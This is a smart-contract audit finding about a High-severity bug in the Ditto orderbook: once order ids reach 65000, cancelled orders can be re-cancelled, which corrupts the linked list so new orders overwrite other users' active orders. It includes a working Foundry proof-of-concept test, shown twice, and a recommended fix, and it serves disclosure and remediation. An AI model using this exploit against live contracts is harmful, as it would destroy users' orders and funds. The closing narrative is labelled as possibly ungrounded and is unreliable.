---
id: 7455
severity: "High"
---

# New orders can overwrite active orders when order id reaches 65000

## Description

When the orderId for an asset reaches 65000 the cancelOrderFarFromOracle allows to cancel an already cancelled order. An attacker can exploit this to overwrite all the active orders in the respective orderbook.

Once the orderId for an asset reaches 65000 cancelOrderFarFromOracle function allows to cancel an order if it's nextId is Constants.TAIL assuming it is the last order in the book.
```solidity
    function cancelOrderFarFromOracle(
        address asset,
        O orderType,
        uint16 lastOrderId,
        uint16 numOrdersToCancel
    ) external onlyValidAsset(asset) nonReentrant {
        if (s.asset[asset].orderId < 65000) {
            revert Errors.OrderIdCountTooLow();
        }

        if (numOrdersToCancel > 1000) {
            revert Errors.CannotCancelMoreThan1000Orders();
        }

        if (msg.sender == LibDiamond.diamondStorage().contractOwner) {
            if (
                orderType == O.LimitBid
                    && s.bids[asset][lastOrderId].nextId == Constants.TAIL
            ) {
                s.bids.cancelManyOrders(asset, lastOrderId, numOrdersToCancel);
            } else if (
            /// more code. similar deletion for asks and shorts
            }
        } else {
            //@dev if address is not DAO, you can only cancel last order of a side
            if (
                orderType == O.LimitBid
                    && s.bids[asset][lastOrderId].nextId == Constants.TAIL
            ) {
                s.bids.cancelOrder(asset, lastOrderId);
            } else if (
            /// more code. similar deletion for asks and shorts
        }
```
https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/facets/OrdersFacet.sol#L124-L177C10

But this assumption is wrong as a previously deleted order can have it's nextId set to Constants.TAIL. This allows an attacker to cancel an already cancelled order which can result in disruption of the linked list maintained for the orders. The attacker can change the route the HEAD's prevId (the cancelled orders list) will take to point to a chain of already existing orders overwriting them when a new order comes. When there are atleast 2 cancelled orders, re cancelling the closest canceled order to the HEAD (HEAD.prevId) will result in the prevId of the cancelled order pointing to itself.

```solidity
    function _reuseOrderIds(
        mapping(address => mapping(uint16 => STypes.Order)) storage orders,
        address asset,
        uint16 id,
        uint16 prevHEAD,
        O cancelledOrMatched
    ) private {
       // more code
       // @audit if the prevHead was order with id itself, then it's prevId will be id
        if (prevHEAD != Constants.HEAD) {
            orders[asset][id].prevId = prevHEAD;
        } else {
```
https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/libraries/LibOrders.sol#L356-L377

When a new order is created, HEAD.prevId is reused. After which the next HEAD.prevId will be HEAD.prevId.prevId. In this case, it will again point to the same id. But now that the order is placed in the orderbook, the prevId of this order points to another active order which will be overwritten when a new order is created.

POC Test
```diff
diff --git a/test/CancelOrder.t.sol b/test/CancelOrder.t.sol
index e7b9e2f..96c6797 100644
--- a/test/CancelOrder.t.sol
+++ b/test/CancelOrder.t.sol
@@ -7,7 +7,7 @@ import {STypes, MTypes, O, SR} from "contracts/libraries/DataTypes.sol";
 import {LibOrders} from "contracts/libraries/LibOrders.sol";

 import {OBFixture} from "test/utils/OBFixture.sol";
-// import {console} from "contracts/libraries/console.sol";
+import {console} from "contracts/libraries/console.sol";

 contract CancelOrderTest is OBFixture {
     using U256 for uint256;
@@ -317,6 +317,92 @@ contract CancelOrderTest is OBFixture {
         });
     }
function test_OnceReached65000NewOrdersCanOverwriteExistingOrders() public {
address attacker = address(78);
vm.label(attacker, "attacker");
uint80 price1 = 1 ether;
uint80 price2 = 2 ether;
uint80 price3 = 3 ether;
uint80 price4 = 4 ether;
uint80 price5 = 5 ether;
uint80 price6 = 6 ether;
uint80 price7 = 7 ether;
uint80 price8 = 8 ether;
uint88 askAmount = 1 ether;
fundLimitAskOpt(price1, askAmount, receiver);
fundLimitAskOpt(price2, askAmount, receiver);
fundLimitAskOpt(price3, askAmount, receiver);
fundLimitAskOpt(price4, askAmount, receiver);
fundLimitAskOpt(price5, askAmount, receiver);
fundLimitAskOpt(price6, askAmount, receiver);
fundLimitAskOpt(price8, askAmount, receiver);
assertEq(getAsks().length, 7);
//setting order id to 65000 and cancelling 2 orders so as to call cancelOrderFarFromOracle() on a cancelled order which has another previous order
vm.prank(owner);
testFacet.setOrderIdT(asset, 65000);
{
uint80 price100 = 100 ether;
fundLimitAskOpt(price100, askAmount, attacker);
fundLimitAskOpt(price100, askAmount, attacker);
vm.startPrank(attacker);
diamond.cancelAsk(asset, 65001);
diamond.cancelAsk(asset, 65000);
}
//since checking for last order by .next == Constatns.TAIL, most recently cancelled order also satisfies this
//this will make the order point to itself as previous
diamond.cancelOrderFarFromOracle({
asset: asset,
orderType: O.LimitAsk,
lastOrderId: 65000,
numOrdersToCancel: 1
});
vm.stopPrank();
//a new order created now will use this order but the head will still be pointing to this order as the previous order / start of cancel order chain
//hence all upcoming orders will replace the orders backwards starting from price7, id=65000
assertEq(getAsks().length, 7);
fundLimitAskOpt(price7, askAmount, receiver);
assertEq(getAsks().length, 8);
uint256[] memory replacingOrders = new uint256[](7);
uint256 replacingOrderIndex = 0;
{
STypes.Order[] memory asks = getAsks();
// now all orders from 7 to 1 are that of receivers
for (uint256 i = 0; i < asks.length; i++) {
assertEq(asks[i].addr, receiver);
if (asks[i].price != price8) {
replacingOrders[replacingOrderIndex] = asks[i].id;
replacingOrderIndex++;
}
}
}
{
//these orders replaces previous orders of the receiver
fundLimitAskOpt(price7, askAmount, attacker);
fundLimitAskOpt(price6, askAmount, attacker);
fundLimitAskOpt(price5, askAmount, attacker);
fundLimitAskOpt(price4, askAmount, attacker);
fundLimitAskOpt(price3, askAmount, attacker);
fundLimitAskOpt(price2, askAmount, attacker);
fundLimitAskOpt(price1, askAmount, attacker);
}
//all orders are that of the attacker
for (uint256 i = 0; i < 7; i++) {
STypes.Order memory ask =
diamond.getAskOrder(asset, uint16(replacingOrders[i]));
assertEq(ask.addr, attacker);
}
}
//NON-DAO
     function testRevertNotLastOrder() public {
         setOrderIdAndMakeOrders({orderType: O.LimitBid});
```

Users having an active order at present or in future will loose their funds.

## Proof of Concept

```diff
diff --git a/test/CancelOrder.t.sol b/test/CancelOrder.t.sol
index e7b9e2f..96c6797 100644
--- a/test/CancelOrder.t.sol
+++ b/test/CancelOrder.t.sol
@@ -7,7 +7,7 @@ import {STypes, MTypes, O, SR} from "contracts/libraries/DataTypes.sol";
 import {LibOrders} from "contracts/libraries/LibOrders.sol";

 import {OBFixture} from "test/utils/OBFixture.sol";
-// import {console} from "contracts/libraries/console.sol";
+import {console} from "contracts/libraries/console.sol";

 contract CancelOrderTest is OBFixture {
     using U256 for uint256;
@@ -317,6 +317,92 @@ contract CancelOrderTest is OBFixture {
         });
     }
function test_OnceReached65000NewOrdersCanOverwriteExistingOrders() public {
address attacker = address(78);
vm.label(attacker, "attacker");
uint80 price1 = 1 ether;
uint80 price2 = 2 ether;
uint80 price3 = 3 ether;
uint80 price4 = 4 ether;
uint80 price5 = 5 ether;
uint80 price6 = 6 ether;
uint80 price7 = 7 ether;
uint80 price8 = 8 ether;
uint88 askAmount = 1 ether;
fundLimitAskOpt(price1, askAmount, receiver);
fundLimitAskOpt(price2, askAmount, receiver);
fundLimitAskOpt(price3, askAmount, receiver);
fundLimitAskOpt(price4, askAmount, receiver);
fundLimitAskOpt(price5, askAmount, receiver);
fundLimitAskOpt(price6, askAmount, receiver);
fundLimitAskOpt(price8, askAmount, receiver);
assertEq(getAsks().length, 7);
//setting order id to 65000 and cancelling 2 orders so as to call cancelOrderFarFromOracle() on a cancelled order which has another previous order
vm.prank(owner);
testFacet.setOrderIdT(asset, 65000);
{
uint80 price100 = 100 ether;
fundLimitAskOpt(price100, askAmount, attacker);
fundLimitAskOpt(price100, askAmount, attacker);
vm.startPrank(attacker);
diamond.cancelAsk(asset, 65001);
diamond.cancelAsk(asset, 65000);
}
//since checking for last order by .next == Constatns.TAIL, most recently cancelled order also satisfies this
//this will make the order point to itself as previous
diamond.cancelOrderFarFromOracle({
asset: asset,
orderType: O.LimitAsk,
lastOrderId: 65000,
numOrdersToCancel: 1
});
vm.stopPrank();
//a new order created now will use this order but the head will still be pointing to this order as the previous order / start of cancel order chain
//hence all upcoming orders will replace the orders backwards starting from price7, id=65000
assertEq(getAsks().length, 7);
fundLimitAskOpt(price7, askAmount, receiver);
assertEq(getAsks().length, 8);
uint256[] memory replacingOrders = new uint256[](7);
uint256 replacingOrderIndex = 0;
{
STypes.Order[] memory asks = getAsks();
// now all orders from 7 to 1 are that of receivers
for (uint256 i = 0; i < asks.length; i++) {
assertEq(asks[i].addr, receiver);
if (asks[i].price != price8) {
replacingOrders[replacingOrderIndex] = asks[i].id;
replacingOrderIndex++;
}
}
}
{
//these orders replaces previous orders of the receiver
fundLimitAskOpt(price7, askAmount, attacker);
fundLimitAskOpt(price6, askAmount, attacker);
fundLimitAskOpt(price5, askAmount, attacker);
fundLimitAskOpt(price4, askAmount, attacker);
fundLimitAskOpt(price3, askAmount, attacker);
fundLimitAskOpt(price2, askAmount, attacker);
fundLimitAskOpt(price1, askAmount, attacker);
}
//all orders are that of the attacker
for (uint256 i = 0; i < 7; i++) {
STypes.Order memory ask =
diamond.getAskOrder(asset, uint16(replacingOrders[i]));
assertEq(ask.addr, attacker);
}
}
//NON-DAO
     function testRevertNotLastOrder() public {
         setOrderIdAndMakeOrders({orderType: O.LimitBid});
```

## Recommendation

Add to checks to see if the order is already cancelled. Since this function also doesn't reimburse funds it would be best to change it to the way a normal cancel order function would work except that msg.sender could be anybody.
```diff
diff --git a/contracts/facets/OrdersFacet.sol b/contracts/facets/OrdersFacet.sol
index 0a924e7..7cbb8bd 100644
--- a/contracts/facets/OrdersFacet.sol
+++ b/contracts/facets/OrdersFacet.sol
@@ -59,6 +59,11 @@ contract OrdersFacet is Modifiers {
     {
         STypes.Order storage ask = s.asks[asset][id];
         if (msg.sender != ask.addr) revert Errors.NotOwner();
_cancelAsk(asset, id);
}
function _cancelAsk(address asset, uint16 id) internal {
STypes.Order storage ask = s.asks[asset][id];
         O orderType = ask.orderType;
         if (orderType == O.Cancelled || orderType == O.Matched) {
             revert Errors.NotActiveOrder();
@@ -165,7 +170,8 @@ contract OrdersFacet is Modifiers {
                 orderType == O.LimitAsk
                     && s.asks[asset][lastOrderId].nextId == Constants.TAIL
             ) {
s.asks.cancelOrder(asset, lastOrderId);
_cancelAsk(asset, lastOrderId);
// s.asks.cancelOrder(asset, lastOrderId);
             } else if (
                 orderType == O.LimitShort
                     && s.shorts[asset][lastOrderId].nextId == Constants.TAIL
```

Similar changes to bids and shorts

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is a linked‑list corruption in the orderbook that occurs once the per‑asset order identifier reaches the value 65000. The contract assumes that an order whose nextId field equals Constants.TAIL is the last active order in the list, and the cancelOrderFarFromOracle function uses this assumption to allow cancellation of the last order. However, when an order has already been cancelled, its nextId is also set to Constants.TAIL, so the function can be called on a cancelled order. By invoking cancelOrderFarFromOracle on such a stale entry, an attacker can manipulate the HEAD.prevId pointer so that it references a cancelled order that points to itself. Subsequent order creation reuses the stale order identifier (HEAD.prevId) and overwrites the data of previously active orders. This results in active orders being silently replaced, causing users to lose their positions and associated funds. The bug is triggered only when the order counter for a given asset is at least 65000 and there are at least two cancelled orders in the list, allowing the self‑referencing prevId condition to be created. It can be exploited by any caller who can invoke cancelOrderFarFromOracle with the appropriate lastOrderId, which may be the contract owner or, for non‑owner callers, the last order of a side. The issue was discovered during a manual audit and reproduced with a test that forces the order counter to 65000, cancels two orders, and then calls cancelOrderFarFromOracle on a cancelled order, after which new orders overwrite existing ones. The problem is hard to notice because the external view of the orderbook (e.g., length or UI listing) may still appear correct while the underlying linked list is corrupted, leading to unexpected order replacement and loss of funds. The root cause is an incorrect assumption about the uniqueness and activity status of the order identified by nextId == Constants.TAIL, combined with reuse of order identifiers without verifying that the target order is still active. To remediate, the contract should verify that the order being cancelled is not already in a Cancelled or Matched state before allowing cancellation, ensure that cancelled orders are never considered as the last order, and prevent reuse of identifiers that belong to cancelled orders. A safer design would involve separate tracking of free identifiers or a monotonic counter that never wraps, and updating the linked‑list pointers only for active nodes. This class of bug falls under improper linked‑list management and identifier reuse, leading to state corruption and potential fund loss.
